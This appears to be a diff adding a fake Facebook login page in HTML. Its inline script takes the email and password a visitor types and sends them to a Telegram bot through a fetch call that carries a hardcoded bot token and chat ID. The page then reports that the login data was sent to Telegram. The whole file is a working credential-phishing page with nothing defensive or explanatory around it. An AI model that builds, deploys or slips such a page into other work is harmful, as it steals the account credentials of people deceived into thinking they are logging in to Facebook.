@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <div class="login-box">
+            <h2>Log in to Facebook</h2>
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#">Forgotten password?</a>
+                <hr>
+                <button type="button" class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            
+            let botToken = "7584336303:AAFH6XbTmYy9uqjfvQQIr4Mh0OoJHe5QgzM";
+            let chatId = "7700589255";
+            let message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+            
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    alert("Login data sent to Telegram!");
+                })
+                .catch(error => console.error("Error:", error));
+        });
+    </script>
+</body>
+</html>
